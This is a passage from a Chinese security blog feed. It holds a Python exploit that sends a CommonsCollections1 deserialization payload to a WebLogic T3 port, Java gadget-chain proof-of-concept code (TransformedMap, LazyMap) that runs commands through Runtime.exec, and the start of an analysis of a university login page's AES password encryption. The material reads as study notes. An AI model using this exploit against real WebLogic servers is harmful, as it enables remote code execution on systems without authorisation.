class="number">1024</span>)</span><br><span class="line">    <span class="built_in">compile</span> = re.<span class="built_in">compile</span>(<span class="string">&quot;HELO:(.*).0.false&quot;</span>)</span><br><span class="line">    match = <span class="built_in">compile</span>.findall(data.decode())</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Weblogic: &quot;</span>+<span class="string">&quot;&quot;</span>.join(match))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    header = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>)<span class="comment">#占位，之后用payload长度替换</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>)<span class="comment"># t3协议头</span></span><br><span class="line">    desflag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#t3协议序列化数据的开头</span></span><br><span class="line">    payload = header + t3header  +desflag+  payload</span><br><span class="line">    payload = struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections1&quot;</span></span><br><span class="line">    cmd = <span class="string">&quot;touch /tmp/success&quot;</span></span><br><span class="line">    payload = generatePayload(gadget,cmd)</span><br><span class="line">    T3Exploit(ip,port,payload)</span><br></pre></td></tr></table></figure><h3 id="堆栈调用"><a href="#堆栈调用" class="headerlink" title="堆栈调用"></a>堆栈调用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">transform:123, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:157, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">invoke:69, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">entrySet:-1, $Proxy89 (com.sun.proxy)</span><br><span class="line">readObject:346, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke:-1, GeneratedMethodAccessor87 (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1004, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1891, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1796, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">readObject:66, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">read:38, InboundMsgAbbrev (weblogic.rjvm)</span><br><span class="line">readMsgAbbrevs:283, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">init:213, MsgAbbrevInputStream (weblogic.rjvm)</span><br><span class="line">dispatch:498, MsgAbbrevJVMConnection (weblogic.rjvm)</span><br><span class="line">dispatch:330, MuxableSocketT3 (weblogic.rjvm.t3)</span><br><span class="line">dispatch:387, BaseAbstractMuxableSocket (weblogic.socket)</span><br><span class="line">readReadySocketOnce:967, SocketMuxer (weblogic.socket)</span><br><span class="line">readReadySocket:899, SocketMuxer (weblogic.socket)</span><br><span class="line">processSockets:130, PosixSocketMuxer (weblogic.socket)</span><br><span class="line">run:29, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:42, SocketReaderRequest (weblogic.socket)</span><br><span class="line">execute:145, ExecuteThread (weblogic.kernel)</span><br><span class="line">run:117, ExecuteThread (weblogic.kernel)</span><br></pre></td></tr></table></figure><h3 id="TransformedMap利用链"><a href="#TransformedMap利用链" class="headerlink" title="TransformedMap利用链"></a>TransformedMap利用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] trans_chain = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans_chain);</span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了完成<code>Runtime.getRuntime().exec()</code> ，<code>ConstantTransformer.transform</code> 返回传入的参数，传入<code>Runtime.class</code>完成第一步。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>InvokerTransformer.transform</code>根据传入的函数名和该函数参数去调用该函数，分别获得getRuntime和exec。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ChainedTransformer.transform</code>根据传入的Transformer数组遍历调用<code>transform</code>，达成<code>Runtime.getRuntime().exec()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以下一步就是想办法调用<code>ChainedTransformer</code>的<code>transform</code>方法，因为反序列化会调用<code>readObject</code>，所以需要找到一个类重写了该方法。</p><p>Todo</p><h3 id="LazyMap利用链"><a href="#LazyMap利用链" class="headerlink" title="LazyMap利用链"></a>LazyMap利用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">    String var4 = var2.getName();</span><br><span class="line">    Class[] var5 = var2.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">&quot;annotationType&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object var6 = <span class="keyword">this</span>.memberValues.get(var4);</span><br><span class="line">            <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, var4);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                    var6 = <span class="keyword">this</span>.cloneArray(var6);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> var6;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，当代理类对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke ()方法来进行调用。<br><a href="https://www.mi1k7ea.com/2019/02/01/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/#InvocationHandler%E6%8E%A5%E5%8F%A3">https://www.mi1k7ea.com/2019/02/01/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/#InvocationHandler%E6%8E%A5%E5%8F%A3</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testExec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] trans_chain = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(trans_chain);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map lzMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        <span class="comment">// 通过反射机制实例化AnnotationInvocationHandler</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,lzMap);</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),handler);</span><br><span class="line"></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(handler1);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地模拟反序列化</span></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p><a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">https://www.cnblogs.com/ph4nt0mer/p/11772709.html</a></p><p><a href="https://reader-l.github.io/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">https://reader-l.github.io/2021/07/04/Weblogic%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>某大学登陆流程分析</title>
      <link href="2021/03/05/auth/"/>
      <url>2021/03/05/auth/</url>
      
        <content type="html"><![CDATA[<h3 id="动手！"><a href="#动手！" class="headerlink" title="动手！"></a>动手！</h3><p>首先登录、抓包，查看所提交的参数,<code>password</code>被加密并经过base64编码。<br><img src="/2021/03/05/auth/1.jpg" alt="img"></p><p>F12审查元素，查看登陆表单以及所绑定事件。<br><img src="/2021/03/05/auth/2.jpg" alt="img"></p><p>将<code>password</code>和<code>pwdDefaultEncryptSalt</code>传入<code>_etd2</code>函数，<code>pwdDefaultEncryptSalt</code>（下文中简称key）可在表单中获取。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> username = casLoginForm.find(<span class="string">&quot;#username&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> password = casLoginForm.find(<span class="string">&quot;#password&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!checkRequired(username, <span class="string">&quot;usernameError&quot;</span>)) &#123;</span><br><span class="line">        username.focus();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!checkRequired(password, <span class="string">&quot;passwordError&quot;</span>)) &#123;</span><br><span class="line">        password.focus();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> captchaResponse = casLoginForm.find(<span class="string">&quot;#captchaResponse&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!checkRequired(captchaResponse, <span class="string">&quot;cpatchaError&quot;</span>)) &#123;</span><br><span class="line">        captchaResponse.focus();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _etd2(password.val(), casLoginForm.find(<span class="string">&quot;#pwdDefaultEncryptSalt&quot;</span>).val());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>password</code>和<code>key</code>传入<code>encryptAES</code>,可知加密算法为AES。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_etd2</span>(<span class="params">_p0, _p1</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _p2 = encryptAES(_p0, _p1);</span><br><span class="line">        $(<span class="string">&quot;#casLoginForm&quot;</span>).find(<span class="string">&quot;#passwordEncrypt&quot;</span>).val(_p2);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        $(<span class="string">&quot;#casLoginForm&quot;</span>).find(<span class="string">&quot;#passwordEncrypt&quot;</span>).val(_p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_rds</code>函数为产生指定长度随机字符串，<code>encryptAES</code>函数将64位的随机字符串拼接上<code>password</code>作为第一个参数，<code>key</code>和16位随机字符串作为后两个参数传入<code>_gas</code>函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptAES</span>(<span class="params">data, _p1</span>) </span>&#123;</span><br><span class="line">    <span 